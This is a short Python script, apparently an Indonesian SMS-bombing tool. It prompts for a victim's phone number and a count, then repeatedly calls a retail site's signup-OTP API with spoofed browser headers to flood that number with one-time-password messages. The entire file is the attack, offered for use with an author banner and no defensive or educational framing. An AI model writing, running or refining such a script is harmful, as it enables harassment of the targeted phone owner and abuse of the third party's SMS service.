import json
import requests
import sys
import os




def main():
	os.system('clear')
	os.system('figlet cemonk01 x Tiktod')
	banner = '''



	[+]AUTHOR :cemonk01
	[+]Tiktod :jigongbapakau_
	'''

	print(banner)
	no = input('no targetnya tod : ')
	jum = input('ini jumlah spam nya tod : ')




	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}



	dat = {
	'phone' : no
	}


	for x in range(int(jum)) :
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)




	if 'eror' in leosureo:

		print('gagal mengirim cok' + no)

	else:
		print('succses mengirim tod' + no)





main()
